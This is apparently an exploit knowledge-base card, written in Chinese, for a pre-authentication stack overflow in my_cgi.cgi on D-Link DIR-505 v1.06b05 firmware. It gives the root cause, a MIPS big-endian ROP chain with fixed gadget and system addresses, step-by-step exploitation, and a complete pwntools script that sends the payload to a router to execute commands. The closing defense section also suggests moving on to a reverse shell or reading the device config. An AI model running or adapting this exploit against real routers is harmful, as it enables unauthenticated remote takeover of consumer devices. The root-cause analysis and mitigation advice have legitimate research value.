---
id: binary-pwn-stack-dir505-my-cgi-content-length-overflow-mipseb-rop
title: DIR-505 my_cgi.cgi CONTENT_LENGTH 解析栈溢出：mipseb ROP 调 system 执行命令
type: scenario
domain: binary
path: binary/pwn/stack
technique: dir505-my-cgi-content-length-parser-stack-overflow-mips-eb-rop-system
aliases:
- DIR-505
- my_cgi.cgi
- get_input_entries
- CONTENT_LENGTH
- mipseb
- D-Link DIR-505
- a=a&
tags:
- pwn
- stack-overflow
- mips
- mips-eb
- router
- firmware
- dlink
- cgi
- rop
- command-execution
- content-length
- iot
cve: []
severity: high
confidence: high
status: verified
affected_versions: D-Link DIR-505 REV_A Firmware v1.06b05 (DIR505A1_FW106B05.bin)
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V131
  verified_at: '2026-11-06T05:42:40+08:00'
  notes: 已对照原文核对（原文无图片）：DIR-505 REV_A v1.06b05/mipseb、main 栈缓冲区 477456 字节、get_input_entries 以 1061 字节槽位按 CONTENT_LENGTH 无界写入、450 组 a=a& 后偏移 0x7490A、gadget 0x0040f3c4/0x0040e87c、system 0x42A500、gp 0x44ff10、POST /my_cgi.cgi 实测 echo `ls /` 均与原文一致；affected_versions 已按原文固件名标注。未在本机复跑 PoC。
---

## 一句话结论

DIR-505 v1.06b05 的 `my_cgi.cgi` 在 `get_input_entries()` 中按 `CONTENT_LENGTH` 逐字节读取 POST 体，把键值对写入 main 栈上 0x74910 字节缓冲区时按 `1061 × 已见 '&' 数 + 偏移` 寻址，既不校验条目数也不校验写入偏移；约 450 个 `&` 就能把写指针推到缓冲区末尾并覆盖 main 保存的 `$ra`。固件为 mipseb（32 位大端）、无 canary，可用固定地址 gadget 把 `$a0` 指向栈内命令串并跳 `system`，通过 `POST /my_cgi.cgi` 在认证前执行任意命令。

## 原理

- **CGI 入口**：lighttpd 以 CGI 方式执行 `/my_cgi.cgi`，用环境变量传 `REQUEST_METHOD`、`CONTENT_LENGTH`、`CONTENT_TYPE`、`SCRIPT_NAME` 等，POST 体通过管道从 stdin 读入。
- **栈缓冲区**：main 在栈上定义 `char s_[477456]`（0x74910）；`size = strtol(getenv("CONTENT_LENGTH"), 0, 10)`，当 `size > 0` 且 `CONTENT_TYPE` 不含 `multipart/form-data` 时调用 `get_input_entries(s_, size)`。multipart 分支走 `do_save_file`，不经过该解析器。
- **溢出点**：`get_input_entries` 的读取循环只由 `a2`（CONTENT_LENGTH）控制，与目标缓冲区大小无关：
  - 读到 `=`：`v5 = 0, v6 = 1`；
  - 读到 `&`：`v4++, v5 = 0, v6 = 0`；
  - 其他字符：`v6 ? s1[1061*v4 + 36 + v5] : s1[1061*v4 + v5] = c; v5++`。
- **为什么短输入也能溢出**：每个键值对占 1061 字节槽位，写入偏移由已出现的 `&` 数量乘以 1061 决定。`a=a&` 重复 0x1c2（450）次后 `v4 = 450`，写指针已到 `1061 × 450 = 477450 = 0x7490A`，距 477456 字节缓冲区末尾只剩 6 字节；随后继续发送的字节直接写到 `s_` 之后的栈区域（局部变量、保存的 `$s0-$s7`、`$fp`、`$ra`）。整个循环从不比较 `1061*v4 + v5` 与缓冲区长度，也不限制 `v4` 的条目数。
- **认证前触发**：`get_input_entries` 在 `update_login_time()` 和 `s_[36]` 动作（login/show_message/no_auth 等）判断之前执行，因此无需会话或口令。
- **MIPS 大端劫持执行流**：MIPS 的返回地址在 `$ra`，函数调用子函数时把 `$ra` 保存到栈；main 返回前从栈恢复 `$ra`，覆盖该保存槽即可控制 PC。栈溢出不能直接控制 `$a0`（`system` 的第一个参数），因此用 gadget：
  - `0x0040f3c4`：`addiu $a0,$sp,0x18 ; lw $ra,0x5c($sp) ; lw $v0,0x18($sp) ; lw $gp,0x10($sp) ; jr $ra ; addiu $sp,$sp,0x60`。把 `$a0` 设为 `$sp+0x18`，命令串就放在该栈地址；同时把 `$gp` 填为有效值（0x44ff10），否则 uClibc 的 `system` 会因 `$gp` 无效报错。
  - `0x0040e87c`：`move $a1,$s2 ; lw $gp,0x10($sp) ; sltiu $v0,$v0,1 ; lw $ra,0x24($sp) ; lw $s2,0x20($sp) ; lw $s1,0x1c($sp) ; lw $s0,0x18($sp) ; jr $ra ; addiu $sp,$sp,0x28`。第一个 gadget 的 `addiu $sp,$sp,0x60` 会让 `system` 的栈帧可能覆盖命令串；重复利用该 gadget 把栈再下移 0x10 × 0x28，命令串留在高地址不被覆盖，最后从 `0x24($sp)` 取 `system`（0x42A500）跳转。
- **NUL 无截断**：payload 放在 POST 体里，由 Content-Length 定界，`p32` 出来的 NUL 字节不会被 HTTP 头/URL 编码截断；这与把地址放在 Cookie/头部的场景不同。
- **地址稳定性**：代码段无 PIE，gadget 与 `system` 地址固定；`$a0` 由 `$sp` 相对寻址得到，不需要泄露栈地址；因此该链不依赖关闭 ASLR。

## 触发条件

- 目标为 D-Link DIR-505 REV_A v1.06b05（mipseb）或使用同一 `my_cgi.cgi`/`get_input_entries` 代码的固件；lighttpd 的 `/my_cgi.cgi` 可访问。
- 发送 POST 请求，`CONTENT_TYPE` 缺失或不含 `multipart/form-data`（例如 `text/html`），`CONTENT_LENGTH` 约 1950 字节即可（450 组 `a=a&` 加溢出载荷）；不需要大于 477456。
- 二进制地址与原文构建一致：gadget 0x0040f3c4、gadget 0x0040e87c、`system` 0x42A500、有效 `$gp` 0x44ff10；不同固件版本需重新定位。
- 无需登录：解析与溢出发生在认证判断之前；`check_remote_ip` 也在解析之后才调用。

## 利用步骤

1. 下载并解包固件：`binwalk -e DIR505A1_FW106B05.bin`，squashfs 可用 sasquatch 解包；定位 `/usr/bin/my_cgi.cgi`。
2. 静态分析 `main` 与 `get_input_entries`，确认 1061 字节槽位步长、`s_` 大小 0x74910、调用顺序与 `system`/gadget 地址。
3. 动态验证：补齐库文件软链接，把 `qemu-mips-static` 放进 squashfs-root，用 `chroot` 运行（`qemu-mips -L` 不是 chroot，uClibc 的 `ld-uClibc.so.0` 会读宿主机 `/etc/ld.so.cache` 而失败）；加 `-g <port>` 与 `gdb-multiarch` 远程调试。
4. 用 ROPgadget 在 `my_cgi.cgi` 中确认 `addiu $a0,$sp,...`、`lw $ra,...; jr $ra` 与栈下移 gadget，并确认 `$gp` 取值。
5. 构造 payload：0x1c2 组 `a=a&`；0x32 字节填充；gadget1；0x10 字节填充；`$gp`；0x44 字节命令串；gadget2；0x10 组（0x24 字节填充 + gadget2）；最后 0x10 字节填充 + `$gp` + 0x10 字节填充 + `system`。
6. 先在 qemu-user 中本地验证（设置 `SCRIPT_NAME=aaaa`、`REQUEST_METHOD=POST`、`CONTENT_TYPE=text/html`、`CONTENT_LENGTH=len(payload)`，从 stdin 发送 payload），确认跳到 `system` 并执行命令。
7. 对真实设备发送原始 HTTP POST：`POST /my_cgi.cgi HTTP/1.1` + `Content-Length` + payload；用 `echo \`ls /\`` 等命令验证回显，按需替换命令。

## PoC

```python
from pwn import *
context(log_level="debug", os="linux", arch="mips", endian="big")

system  = 0x42A500
gadget1 = 0x0040f3c4  # addiu $a0,$sp,0x18; lw $ra,0x5c($sp); lw $v0,0x18($sp); lw $gp,0x10($sp); jr $ra; addiu $sp,$sp,0x60
gadget2 = 0x0040e87c  # move $a1,$s2; lw $gp,0x10($sp); ...; jr $ra; addiu $sp,$sp,0x28

cmd = b"echo `ls /`"
cmd = cmd.ljust(0x44, b"\0")

pay  = b"a=a&" * 0x1c2
pay += b"\0" * 0x32 + p32(gadget1, endian="big") + b"a" * 0x10
pay += flat(0x44ff10, 0) + cmd + flat(gadget2)
for _ in range(0x10):
    pay += b"\0" * 0x24 + flat(gadget2)
pay += b"a" * 0x10 + flat(0x44ff10) + b"a" * 0x10 + flat(system)

req  = b"POST /my_cgi.cgi HTTP/1.1\r\n"
req += b"Host: 192.168.0.1\r\n"
req += b"Content-Length: " + str(len(pay)).encode() + b"\r\n\r\n" + pay

p = remote("192.168.0.1", 80)
p.send(req)
p.interactive()
```

本地 qemu-user 验证时，命令用 `sh` 并把 `/bin/sh`、`/bin/ls` 等软链接到 busybox；payload 直接从 stdin 发送，环境变量用 `-E` 注入。

## 变体与关联

- **解析器变体**：同一 `get_input_entries` 由多个 action 共用；`multipart/form-data` 走 `do_save_file`，HNAP1 路径走 `do_hnap`，需分别分析。
- **架构变体**：mipsel/ARM/x86 路由器 CGI 的 gadget 与调用约定不同；mipsel 下地址可能含 NUL，需要 `system-1` 或编码处理，见 [[binary-pwn-stack-mips-hedwig-cgi-uid-rop]]。
- **保护变体**：无 canary/NX/PIE 时可直接 ROP 调 `system`；有 NX 用 ROP，有 canary 需先泄露，有 PIE 需泄露基址；本链用 `$sp` 相对寻址，不依赖栈地址泄露。
- **关联卡片**：[[binary-pwn-stack-mips-hedwig-cgi-uid-rop]]（另一款 D-Link CGI 的 MIPS ROP）、[[code-analysis-reverse-firmware-qemu-user-mips-ldpreload-gdb]]（qemu-user + chroot + gdb 调试）、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（系统级固件仿真）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（栈溢出基础）。

## 检测与防御

- **代码修复**：在 `get_input_entries` 中限制条目数与单条长度，写入前检查 `1061*v4 + 36 + v5 < sizeof(s_)`；对 `CONTENT_LENGTH` 设上限；用 `snprintf`/`strncpy` 替代无界写入。
- **编译与系统缓解**：开启 canary、NX、PIE、Full RELRO、ASLR；移除可执行栈；CGI 进程降权运行。
- **检测信号**：`/my_cgi.cgi` 收到包含数百个 `&`、Content-Length 仅约 2KB 的 POST；CGI 进程异常退出/崩溃；设备上出现 `system`/`sh` 子进程或异常外联；lighttpd 日志中出现超长或畸形表单体。
- **测试建议**：先确认崩溃与偏移，再在 qemu-user 中关闭干扰变量调试；真实设备上先用无副作用命令（`echo`/`id` 写文件）验证，再替换为反弹 shell 或读取配置。
